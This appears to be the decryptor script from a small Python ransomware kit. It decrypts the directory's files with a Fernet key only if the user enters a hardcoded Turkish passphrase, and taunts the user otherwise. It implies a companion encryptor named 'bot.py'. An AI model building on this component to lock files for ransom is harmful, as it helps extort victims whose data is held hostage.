import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "bot.py" or file == "val_log.key" or file == "Decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("val_log.key", "rb") as auth:
    secretkey = auth.read()

thedamagedcoda = "turk_kahvesi"

user_phrase = input("Kodu gir.\n")

if user_phrase == thedamagedcoda :
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("Dogru.")
else:
    print("Cok kotu. Sanki umrumda.")
